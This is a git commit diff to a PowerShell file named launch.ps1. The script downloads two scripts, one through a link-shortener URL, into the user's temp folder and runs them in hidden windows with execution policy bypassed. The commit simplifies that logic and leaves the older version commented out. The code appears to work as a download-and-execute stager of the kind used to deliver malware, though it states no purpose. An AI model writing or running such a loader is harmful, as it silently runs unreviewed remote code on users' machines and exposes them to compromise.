a3ba75df61b8788a86b38df77822d98453885e15
Joel A Marinay Jr <66583724+joel2128@users.noreply.github.com>
2024-10-21 15:42:48 +0800

    simpler

--- launch.ps1
+++ launch.ps1
@@ -7,29 +7,41 @@ $url2 = "https://lnkfwd.com/u/Kqc2ajEr"
 $destination1 = "$env:TEMP\ftf.ps1"
 $destination2 = "$env:TEMP\Ain1.ps1"
 
-# Use Invoke-WebRequest to download the first file with error handling
-try {
-    Invoke-WebRequest -Uri $url1 -OutFile $destination1 -ErrorAction Stop
-    # Output the path to confirm where the first file was saved
-    # Write-Output "First file downloaded to: $destination1"
-} catch {
-    # Write-Output "Error: Unable to download file from $url1"
-}
-
-# Use Invoke-WebRequest to download the second file with error handling
-try {
-    Invoke-WebRequest -Uri $url2 -OutFile $destination2 -ErrorAction Stop
-    # Output the path to confirm where the second file was saved
-    # Write-Output "Second file downloaded to: $destination2"
-} catch {
-    # Write-Output "Error: Unable to download file from $url2"
-}
-
-
-######## launch the first
+Invoke-WebRequest -Uri $url1 -OutFile $destination1
+Invoke-WebRequest -Uri $url2 -OutFile $destination2
 
 # Run the first script (ftf.ps1) from the %TEMP% directory
 Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\ftf.ps1`"" -Wait
 
 # Run the second script (Ain1.ps1) from the %TEMP% directory after the first finishes
 Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\Ain1.ps1`""
+
+
+
+
+# #debug
+# # Use Invoke-WebRequest to download the first file with error handling
+# try {
+#     Invoke-WebRequest -Uri $url1 -OutFile $destination1 -ErrorAction Stop
+#     # Output the path to confirm where the first file was saved
+#     # Write-Output "First file downloaded to: $destination1"
+# } catch {
+#     # Write-Output "Error: Unable to download file from $url1"
+# }
+
+# # Use Invoke-WebRequest to download the second file with error handling
+# try {
+#     Invoke-WebRequest -Uri $url2 -OutFile $destination2 -ErrorAction Stop
+#     # Output the path to confirm where the second file was saved
+#     # Write-Output "Second file downloaded to: $destination2"
+# } catch {
+#     # Write-Output "Error: Unable to download file from $url2"
+# }
+
+# ######## launch the first
+
+# # Run the first script (ftf.ps1) from the %TEMP% directory
+# Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\ftf.ps1`"" -Wait
+
+# # Run the second script (Ain1.ps1) from the %TEMP% directory after the first finishes
+# Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\Ain1.ps1`""
